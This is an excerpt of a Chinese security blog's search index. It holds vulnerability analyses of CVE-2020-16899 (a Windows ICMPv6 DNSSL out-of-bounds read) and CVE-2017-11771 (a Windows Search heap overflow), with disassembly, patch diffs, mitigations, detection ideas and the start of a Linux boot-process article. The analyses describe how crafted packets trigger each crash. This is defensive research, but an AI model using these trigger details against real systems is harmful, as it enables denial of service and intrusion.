","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"1. 基本信息 漏洞文件：tcpip.sys 漏洞函数： Ipv6pUpdateDNSSL()函数 漏洞对象：ICMPv6路由广播中的option结构(DNS Option structure) ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"2. 背景知识 (限于篇幅问题，此处不对用于DNS配置的IPv6路由广播进行详细介绍，更详细资料可参考RFC8106) 1. 基本知识 IPv6 Router Advertisment (RA) options，也称为DNS RA options，允许IPv6的路由器向IPv6的主机广播DNS Recursive Server Address(DNS递归路由器地址)列表和DNS Search List（DNS搜索列表），其主要用途为在IPv6的主机上进行DNS名称解析以及域后缀的处理。 IPv6 Neighbor Discovery(ND，IPv6邻居发现)和IPv6 Stateless Address Autoconfiguratioin(SLAAC，IPv6无状态地址自动配置)提供了使用一个或多个IPv6地址，默认路由器以及一些其他参数配置固定节点或移动节点的方法。 当漫游主机每次连接到另一个网络时，无法进行手动配置。 虽然可以进行静态配置，但是在诸如笔记本电脑之类的通用主机上通常不建议这样操作。 例如，如果主机运行直接连接到全局DNS的自己的递归名称服务器，那么本地定义的名称空间对主机来说就不可用了。访问DNS是几乎所有主机的基本要求，因此IPv6 SLAAC在没有任何DNS配置支持的情况下，不能在任何实际的网络环境中单独作为替代部署模型。 对于IPv4环境中的DNS服务器来说，这些问题都很容易解决。但是对于IPv6的网络环境，这些问题显得比较棘手。因此，RFC8106定义了一种基于DNS RA选项的机制，以允许IPv6主机执行自动DNS配置。 在通过IPv6 SLAAC自动配置IPv6主机地址并且没有DHCPv6基础结构或一些主机没有DHCPv6客户端的网络环境中，可以使用基于RA的DNS配置作为替代。 但是，对于需要分发其他信息的网络，可能仍然会使用DHCPv6。 在这些网络中，可能不需要基于RA的DNS配置。 基于RA的DNS配置允许IPv6主机获取主机连接到的链接的DNS配置（即DNS递归服务器地址和DNSSL）。 此外，主机会从提供链接配置信息的同一RA消息中学习此DNS配置。 2. 名词解释 Recursive DNS Server (RDNSS)：递归DNS服务器，提供递归DNS解析服务的服务器，用于将域名转换为IP地址或解析成RFC1034和RFC1035中定义的PTR记录。 RDNSS Option：一个用于向IPv6主机传送RDNSS信息的IPv6的RA option【RFC4861】。 DNS Search List (DNSSL)：IPv6主机在执行DNS查询搜索时使用的DNS后缀域名列表，用于搜索简短的不合格域名。 DNSSL Option：一个IPv6 RA选项，用于将DNSSL信息传递到IPv6主机。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"3. 详细分析 1. 基础分析 RFC8106标准化了DNSSL Option，该结构中包含DNS搜索列表(DNSSL)，保证与DHCPv6 option保持相同的奇偶校验，并确保具备确定搜索域的必要功能。 1. 邻居发现扩展 RFC8106中定义的在邻居发现中使用的IPv6 DNS配置算法需要用到2种ND options：RDNSS option和DNSSL option。与该漏洞相关的是DNSSL Option，另外一种则与 CVE-2020-16899相关。 2. DNSSL Option Structure DNSSL Option包含一个或多个DNS后缀，所有的domain name使用相同的Lifetime。如果需要不同的Lifetime值，则需要多个DNSSL Option结构。 DNSSL Option总体结构如下： Offset Size(bytes) Field Descriptioin 0x00 1 Type 8-bit，DNSSL Option type identifier，0x1f(31) 0x01 1 Length option长度（包括\"Type\"和\"Length\"字段），以8个八位位组为单位。最小值为2，此时option中仅有1个domain name。 0x02 2 Reserved 保留字段 0x04 4 Lifetime DNSSL中的domain name可用于名称解析的最长时间（以秒为单位）。默认情况下，该值至少为3 * MaxRtrAdvInterval，其中MaxRtrAdvInterval是RFC4861中定义的最大RA间隔。 0xffffffff表示无穷大， 零值意味着必须不再使用domain names。 0x08 8 Domain Names of DNS Search List 一个或多个domain name。 对于Length字段，如果option中仅有一个domain name，则为最小值为2。 Domain Names of DNS Search List字段中的domain name的编码要遵循RFC1035的3.1节中定义的格式： 多个domian name直接相连。 3. Procedure in IPv6 Hosts 当主机接收到RA消息中的DNS的options时，其处理过程如下： 首先检查Lengh字段的合法性：是否大于等于最小值2； 如果以上验证通过，则主机应按顺序将选项的值复制到DNS存储库和解析器存储库中。 否则，主机必须丢弃这些选项。 4. Crash分析 首先分析dmp文件，查看crash现场： CallStack直接给出了函数的调用链： Icmpv6ReceiveDatagrams() -\u003e Ipv6pHandleRouterAdvertisement() -\u003eIpv6pUpdateDNSSL() -\u003e GetNextSuffixFromOption() 最终是在GetNextSuffixFromOption()函数中报了内存页错误，导致最终的crash。 5. 漏洞原因 Windows IPv6堆栈为DNSSL中的每个domain name分配一个256字节的buffer。 RFC 1035将域名限制为255个字节，因此domain name长度加上末尾的空字符刚好可以满足buffer的大小要求。 但是，漏洞代码处理该部分数据时，其上限等于DNSSL Option中的剩余字节，可以超过256个字节。因此，漏洞代码可能会错误地消耗比为buffer分配的字节更多的字节，从而导致越界读。 如果buffer位于一个memory page的末尾，则该OOB读取就会导致BSOD。 2. 漏洞函数分析 分析使用的文件为Windows 10 1809 x64的tcpip.sys文件，版本为10.0.17763.316。 经过简单分析可以确认，调用链的顶层函数Icmpv6ReceiveDatagrams()没有实质性的与漏洞触发密切相关的处理逻辑，故而跳过。 1. Ipv6pHandleRouterAdvertisement() 在Ipv6pHandleRouterAdvertisement()函数中先对传入的RA消息做预处理，然后根据不同类型的option进入不同的处理流程： 2. Ipv6pUpdateDNSSL() 首先读取Option结构的数据以及Domain name的长度： 接下来，确认读取的数据后，处理后缀部分： 这里在计算Suffixes的长度时，BytesToRead会被限制在0x100字节长度范围内，也就是Suffixes的最大长度为256。然后调用GetNextSuffixFromOption()函数读取Suffix。 3. GetNextSuffixFromOption() 在该函数中，在解析完一个DNS记录后，代码逻辑会来到以下位置： 这里的主要作用是跳过Domain Name中的空字符部分，遇到0就跳过，读取下一个数据，直到遇到非0值。但是在进行边界检查时，使用的条件参数BytesToRead_1是可以进行控制的，从而可以实现绕过，进行越界读。 3. 动态分析 Ipv6pUpdateDNSSL()函数下断，然后发送poc后断下，检查CallStack，确认断点触发流程与静态分析中的函数调用链一致： 此时的各寄存器情况如下： 这里重点看下rdx寄存器中的内容（漏洞函数的第2个参数）： rdx中存放的是一个_NET_BUFFER结构，其详细结构如下： typedef struct _NET_BUFFER { union { struct { PNET_BUFFER Next; PMDL CurrentMdl; ULONG CurrentMdlOffset; union { ULONG DataLength; SIZE_T stDataLength; }; PMDL MdlChain; ULONG DataOffset; }; SLIST_HEADER Link; NET_BUFFER_HEADER NetBufferHeader; }; USHORT ChecksumBias; USHORT Reserved; NDIS_HANDLE NdisPoolHandle; PVOID NdisReserved[2]; PVOID ProtocolReserved[6]; PVOID MiniportReserved[4]; NDIS_PHYSICAL_ADDRESS DataPhysicalAddress; union { PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo; PSCATTER_GATHER_LIST ScatterGatherList; }; } NET_BUFFER, *PNET_BUFFER; 而且在其中找到了触发漏洞的ICMPv6的相关数据。继续向下，来到NdisGetDataBuffer()函数的第1处调用： NdisGetDataBuffer()函数的第1个参数为传入的_NET_BUFFER结构。NdisGetDataBuffer()函数声明如下： PVOID NdisGetDataBuffer( PNET_BUFFER NetBuffer, // [in], a pointer to a NetBuffer structure ULONG BytesNeeded, // [in], the number of contiguous bytes of data requested PVOID Storage, // [in, optional], a pointer to a buffer, or NULL if no buffer is provided by the caller UINT AlignMultiple, // [in], the alignment multiple expressed in power of two. For example, 2, 4, 8, 16, and so forth. If AlignMultiple is 1, then there is no alignment requirement. UINT AlignOffset // [in], the offset, in bytes, from the alignment multiple. ); // Return Value A pointer to the start of the contiguous data or NULL. 如果NetBuffer参数指向的NET_BUFFER结构中的NET_BUFFER_DATA部分的DataLength字段的值小于BytesNeeded参数的值，那么函数返回NULL。函数执行完成后，返回结果如下： 返回的恰好为DNSSL Option的地址。 然后调用NetioAdvanceNetBuffer()函数。执行NetioAdvanceNetBuffer()函数之前，_NET_BUFFER的结构如下所示： 在执行完NetioAdvanceNetBuffer()函数后，结构变为： 此处该函数主要作用是前进8个字节进行数据读取，其整体流程及部分关键参数值如下： 继续向下，通过Length字段计算BytesToRead的长度，并对Lifetime的值进行是否为0xffffffff的检查： 后续会进行一些上下文初始化、事件记录等操作，然后进入循环，开始处理Opt","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:3","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"4. 利用思路 1. 利用条件 基本条件 attacker需要获取target的IPv6和MAC地址 触发过程 attacker可以直接发起远程攻击 2. 利用过程 attacker直接发送特制的ICMPv6路由广播数据包给target： [ Attacker ] \u003c--------------------\u003e [ Target ] 3. 攻击向量 建立连接后，利用IPv6直接发送攻击数据包即可。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:4","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"5. 流量分析 因为该漏洞直接走的IPv6，所以对于一些部署在IP层以上的防火墙方案就无法针对该漏洞进行流量检测，但是具备IP层流量检测的防火墙可以轻松检测恶意流量： 使用大量的0进行填充以触发漏洞。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:5","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"6. 补丁分析 1. 补丁对比结果 针对Ipv6pUpdateDNSSL()函数的补丁对比结果如下： 2. 补丁思路 根据补丁对比结果，微软新增了对BytesToRead值的校验，在读取完Suffixes之后，为确保不发生越界读，新增了一次对BytesToRead的校验，确保小于0x100。而在漏洞分析中，触发漏洞时该值是大于0x100的。 3. 补丁验证 使用安装更新补丁后的Ipv6UpdateDNSSL()函数进行验证，新增保证BytesToRead的值最大为0x100的代码： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:3:6","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"四、缓解措施 管理员启动powershell或cmd，输入以下命令检查所有网络IPv6接口的列表以及相应的索引号： netsh int ipv6 sh int 样例输出如下： 确认网络接口的RDNSS功能开启情况： netsh int ipv6 sh int Idx number 执行以下命令关闭RDNSS功能(将Idx number替换为要关闭的网络接口的Idx值)： netsh int ipv6 set int Idx number rabaseddnsconfig=disable 样例输出如下： 此时再次确认接口的RDNSS开启情况，RDNSS功能已被关闭： ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:4:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"五、漏洞检测和防御 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:5:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"1. 漏洞检测 针对该漏洞，目前暂未发现漏洞原理侧的无损检测。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:5:1","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"2. 漏洞防御 1. 防御思路 流量防御：需要监控IPv6的流量传输，对于Type为134的路由广播数据包进行检测，确认其Type为0x1f的DNSSL的Padding部分是否有大于等于256个0字符。 终端防御：根据补丁对比结果，可以按照微软的补丁思路使用热补丁进行防御，对BytesToRead的值再加一次校验。 2. 可能存在的风险 暂时未知。 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:5:2","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"六、参考文献 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16899 https://tools.ietf.org/html/rfc8106 ","date":"2020-10-25","objectID":"/2020/10/CVE-2020-16899/:6:0","tags":["Security","Vulnerability"],"title":"CVE-2020-16899 Windows TCP/IP拒绝服务漏洞分析","uri":"/2020/10/CVE-2020-16899/"},{"categories":["Vuln"],"content":"简单分析CVE-2017-11771","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"CVE-2017-11771 Windows Search 堆溢出漏洞简单分析 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:0:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"一、漏洞信息 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞简述 漏洞名称：Windows Search 堆溢出漏洞 漏洞编号：CVE-2017-11771；Bugtraq ID：101114 漏洞类型：Remote Code Execution ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:1","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"2. 组件概述 Windows搜索是一个桌面搜索平台，具有针对大多数常见文件类型和数据类型的即时搜索功能。 它的主要组件是WSearch Windows Service，它负责索引，组织和提取有关本地文件系统的信息。 此外，它实现了通用搜索服务（GSS），它是向搜索查询提供结果所需的后端功能。 客户端使用Windows搜索协议（WSP）向托管GSS的服务器发出查询。 WSP依靠名为管道协议的服务器消息块（SMB）进行消息传输和身份验证。 Microsoft Windows的所有版本均附带服务器消息块（SMB）协议的实现。 SMB是本机Windows网络框架，支持文件共享，网络打印，远程过程调用和其他功能。在Windows系统上，SMB协议通过附加的安全性，文件和磁盘管理支持扩展了CIFS协议。 通过各种SMB命令和子命令类型提供这些功能。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:2","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"3. 漏洞利用 Windows Search服务在处理内存中的对象时存在缺陷，会造成堆溢出。远程未经过认证的攻击者可以通过向目标主机发起一个恶意请求实现任意代码执行，成功的攻击可以获得目标主机的SYSTEM权限。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:3","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"4. 漏洞影响版本 • Microsoft Windows 7 • Microsoft Windows 8 • Microsoft Windows 8.1 • Microsoft Windows 10 • Microsoft Windows Server 2003 • Microsoft Windows Server 2008 • Microsoft Windows Server 2012 • Microsoft Windows Server 2016 • Microsoft Windows Vista • Microsoft Windows XP ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:4","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"5. 解决方案 获取微软官方针对此漏洞的安全补丁，地址： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11771 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:1:5","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"二、漏洞复现 暂无 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:2:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"1. 环境搭建 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:2:1","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"2. 复现过程 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:2:2","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞基本信息 漏洞文件：tquery.dll 漏洞函数：CFixedVarBufferAllocator::CFixedVarBufferAllocator() 漏洞参数：cbReadBuffer and cbReserved 漏洞对象：堆分配的buffer ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:1","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"2. 背景知识 备注：此处略去SMB相关介绍，漏洞自身与SMB关系不大，SMB只是作为WSP传输的工具协议，使用的pipe名称为MsFteWds。 Windows Search Protocol(WSP) 使用WSP的最小搜索查询其流程大概如下： [ Client ] --------------------\u003e [ Server ] - CPMConnectIn [ Client ] \u003c-------------------- [ Server ] - CPMConnectOut [ Client ] --------------------\u003e [ Server ] - CPMCreateQueryIn [ Client ] \u003c-------------------- [ Server ] - CPMCreateQueryOut [ Client ] --------------------\u003e [ Server ] - CPMSetBindingsIn request [ Client ] \u003c-------------------- [ Server ] - CPMSetBindingsIn response [ Client ] --------------------\u003e [ Server ] - CPMGetRowsIn [ Client ] \u003c-------------------- [ Server ] - CPMGetRowsOut [ Client ] --------------------\u003e [ Server ] - CPMGetFreeCursorIn [ Client ] \u003c-------------------- [ Server ] - CPMGetFreeCursorOut [ Client ] --------------------\u003e [ Server ] - CPMDisconnect CPMConnectIn消息开始于客户端和服务器之间的会话，CPMCreateQueryIn包含查询条件并创建新查询，CPMSetBindingsIn指定如何在CPMGetRowsOut中构建搜索结果，CPMGetRowsIn从服务器返回的查询结果中请求数据。 所有的WSP消息以一个16字节的头部开始，其结构如下： Offset Size (bytes) Field -------------------------------------------- 0x00 0x4 _msg 0x04 0x4 _status 0x08 0x4 _ulChecksum 0x0c 0x4 _ulReserved2 _msg字段标识标头部后面的消息类型（有的一个value表示两种类型，此时要根据数据流的传输方向判定具体代表哪种类型。带\"In\"字符的是从client到server，带\"Out\"字符的是从server到client）； _status字段表明所请求操作的状态，由服务器填充； _ulChecksum包含从_ulReserved2字段后面开始的消息的校验和； _ulReserved2字段除了后续的消息为CPMGetRowsIn之外，都必须设置为0。 与本漏洞相关的是CPMGetRowsIn消息。该消息主要用于从查询中请求数据行(row)，其详细格式如下： Offset Size (bytes) Field ------------------------------------------ 0x00 0x4 hCursor 0x04 0x4 cRowsToTransfer 0x08 0x4 cbRowWidth 0x0c 0x4 cbSeek 0x10 0x4 cbReserved 0x14 0x4 cbReadBuffer 0x18 0x4 ulClientBase 0x1c 0x4 fBwdFetch 0x20 0x4 eType 0x24 0x4 chapt 0x28 variable SeekDescription cRowsToTransfer字段指定CPMGetRowsOut消息中包括多少row，cbRowWidth字段表示row的长度（以字节为单位），cbReserved字段指定结果在CPMGetRowsOut消息中的偏移量(与cbSeek字段相加然后进行计算偏移)，cbReadBuffer字段指定 CPMGetRowsOut消息中的数据大小，以字节为单位，该字段必须设置为_cbRowWidth值的最大值或_cRowsToTransfer值的1000倍，四舍五入到最接近的512字节倍数。 该值不得超过0x00004000。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:2","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"3. 详细分析 server接收到CPMGetRowsIn消息后，首先检查cbReserved的值是否小于cbReadBuffer。然后调用CFixedVarBufferAllocator::CFixedVarBufferAllocator()来初始化buffer，该buffer中应该有相应的CPMGetRowsOut消息。该函数会使用下面的方式对结果数据进行初始位置和结束位置的计算： resultDataStart = buffer + cbReversed resultDataEnd = buffer + cbReadBuffer 如果计算出的resultDataEnd不是8字节对齐的，则函数一次从resultDataEnd减去一个字节，直到对齐为止。 但是，在返回分配的buffer前，函数没有对resultDataEnd是否大于等于resultDataStart进行验证，直接调用了CFixedVarBufferAllocator::CFixedVarBufferAllocator()函数进行初始化buffer的chunk分配。AllocFixed()函数使用下面的方式来确认buffer中是否有足够空间： resultDataEnd - resultDataStart \u003c cbRowWidth 因为CFixedvarBufferAllocator()没有进行两个字段大小的比较，所以有可能会出现resultDataEnd小于resultDataStart的情况，这样当两个字段进行减法运算的时候就会造成溢出。然后会调用AllocFixed()函数进行内存分配，但是此时的buffer的offset有可能是错误的。当row被复制到分配的chunk时，数据会被写到buffer的末尾，最终导致一个堆溢出。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:3","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"4. 源码分析 # CRequestServer::DoGetRows(): .text:62A6912A mov eax, [esi+20h] ; cbReserved .text:62A6912D mov edi, [esi+24h] ; cbReadBuffer [......] .text:62A6915F cmp eax, edi .text:62A69161 jb loc_62AA21B3 ; ensure cbReserved \u003c cbReadBuffer [......] .text:62A691DE push [ebp+cbReserved] ; cbReserved .text:62A691E1 lea ecx, [ebp+fixedVarBuffer] ; this .text:62A691E7 push ebx ; cbRowWidth .text:62A691E8 push edi ; cbReadBuffer .text:62A691E9 push [ebp+clientBase] ; clientBase .text:62A691EC push esi ; base of message .text:62A691ED call ??0CFixedVarBuff... ; CFixedVarBufferAllocator() # CFixedVarBufferAllocator::CFixedVarBufferAllocator(): .text:62A68413 mov ecx, [ebp+msgBase_arg0] .text:62A68416 push ebx .text:62A68417 mov dword ptr [eax+8], offset ??_7PFixedA... .text:62A6841E push esi .text:62A6841F mov esi, [ebp+cbReserved_arg10] .text:62A68422 mov [eax+14h], edx .text:62A68425 lea edx, [esi+ecx] ; resultDataStart .text:62A68428 mov [eax+18h], edx .text:62A6842B mov edx, [ebp+cbReadBuffer_arg8] .text:62A6842E xor ebx, ebx .text:62A68430 add edx, ecx ; resultDataEnd .text:62A68432 test ecx, ecx .text:62A68434 push edi .text:62A68435 mov edi, [ebp+cbRowWidth_argC] .text:62A68438 setnz bl .text:62A6843B mov [eax+20h], edi .text:62A6843E pop edi .text:62A6843F mov [eax+24h], esi .text:62A68442 pop esi .text:62A68443 mov dword ptr [eax], offset ??_7CFixedVar... .text:62A68449 mov dword ptr [eax+8], offset ??_7CFixedV... .text:62A68450 mov [eax+4], ebx .text:62A68453 mov [eax+0Ch], ecx .text:62A68456 mov [eax+10h], ecx .text:62A68459 mov [eax+1Ch], edx .text:62A6845C pop ebx .text:62A6845D test dl, 7 ; check if resultDataEnd is 8-byte aligned .text:62A68460 jnz loc_62AA20DA .text:62A68466 pop ebp ; fails to validate resultDataEnd \u003e= resultDataStart .text:62A68467 retn 14h [......] .text:62AA20DA dec dword ptr [eax+1Ch] ; subtract resultDataEnd .text:62AA20DD test byte ptr [eax+1Ch], 7 ; check alignment .text:62AA20E1 jz loc_62A68466 .text:62AA20E7 jmp short loc_62AA20DA # CFixedVarBufferAllocator::AllocFixed(): .text:62A745B0 mov edi, edi .text:62A745B2 push ebp .text:62A745B3 mov ebp, esp .text:62A745B5 mov eax, [ecx+10h] .text:62A745B8 mov edx, [ecx+18h] .text:62A745BB sub esp, 20h .text:62A745BE push esi .text:62A745BF mov esi, [ecx+14h] .text:62A745C2 sub esi, eax ; resultDataEnd - resultDataStart .text:62A745C4 cmp edx, esi ; compare above difference to cbRowWidth .text:62A745C6 ja loc_62AA20E9 .text:62A745CC add edx, eax ; add cbRowWidth to resultDataStart .text:62A745CE mov [ecx+10h], edx .text:62A745D1 pop esi .text:62A745D2 leave .text:62A745D3 retn ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:4","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"5. 攻击流量 SMB1: SMB2: ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:5","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"6. PoC分析 首先进行了前期的验证工作，例如创建命名管道，建立查询连接，判断文件夹是否处于共享访问。按照查询流程依次进行数据发送，来到GetRowsIn消息： ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:3:6","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"四、漏洞检测和防御 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:4:0","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"1. 漏洞检测 暂无。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:4:1","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Vuln"],"content":"2. 漏洞防御 1. 检测思路 首先监控通过SMB建立MsFtewds命名管道的操作，然后使用byte_math检测出现漏洞的字段 2. 可能存在的风险 SMBandx命令有链式结构，可以嵌套，容易产生绕过。 ","date":"2020-10-23","objectID":"/2020/10/CVE-2017-11771/:4:2","tags":["Security","Vulnerability"],"title":"CVE-2017-11771  Windows Search 堆溢出漏洞简单分析","uri":"/2020/10/CVE-2017-11771/"},{"categories":["Tech"],"content":"Linux开机引导和启动过程详解","date":"2020-10-19","objectID":"/2020/10/boot/","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"Linux开机引导和启动过程详解 ","date":"2020-10-19","objectID":"/2020/10/boot/:0:0","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"一、概述 操作系统的启动过程本质上分为2个阶段：boot（引导）阶段和startup（启动）阶段。引导阶段开始于打开电源剋管，结束于内核初始化完成和systemd进程成功运行；启动阶段接管了剩余的其他的工作，一直到OS进入可操作状态。其涵盖的内容可以用下图表示： 本文主要以GRUB和systemd为载体，尽可能详细地描述OS的引导和启动过程。 ","date":"2020-10-19","objectID":"/2020/10/boot/:1:0","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"二、引导过程 引导过程的初始化可以通过2种方式实现：关机状态下的电源开启，开机状态的OS重启。其过程主要有以下几个阶段： ","date":"2020-10-19","objectID":"/2020/10/boot/:2:0","tags":["Security","Linux"],"title":"Linux开机引导和启动过程详解","uri":"/2020/10/boot/"},{"categories":["Tech"],"content":"1. 硬件启动流程 1. BIOS上电自检（POST） BIOS的第一步是上电自检，检查硬件的基本功能是否正常。如果POST失败，那么引导过程失败，电脑启动失败。POST检查成功后，产生一个BIOS中断 – INT 13H，该中断指向某个接入的可引导设备的引导扇区。它所找到的包含有效的引导记录的第一个引导扇区将被装在到内存0x7c00处，并且控制权也将从引导扇区转移到此段代码。也就是说，该中断指向的中断服务程序实际上就是磁盘服务程序，其主要用途就是将指定扇区的代码加载到内存的指定位置。 BIOS中包含了CPU的相关信息、设备启动顺序信息、硬盘信息、内存信息、时钟信息、PnP特性等，因此BIOS信息对于计算机来说十分重要。只有顺利通过BIOS自检，计算机才能继续后续流程，知道应该去读取哪个硬件设备。在BIOS将OS的控制权交给硬盘的第一个扇区后，就开始由Linux来控制系统了。 2. 读取MBR POST结束后，BIOS会在接入的磁盘中查找引导记录，其通常位于MBR，它加载它找到第一个引导记录到内存中，并开始执行代码。MBR是磁盘上第0磁道的第一个扇区 – Master Boot Record，大小为512字节，里面存放了预启动信息、分区表信息，总体可分为2部分：第一部分为引导（PRE-BOOT）区，大小为446字节，其内容为引导代码，这446字节的文件通常被叫做引导镜像(boot.img)；第二部分为分区表（PARTITION PABLE），大小为66字节，记录硬盘分区信息。（MBR的详细描述可见文章MBR详述） 系统找到BIOS指定的磁盘的MBR后，就将其复制到0x7c00地址所处的物理内存中。这里被复制的内容，就是boot loader，常见的有lilo，grub，grub2等。 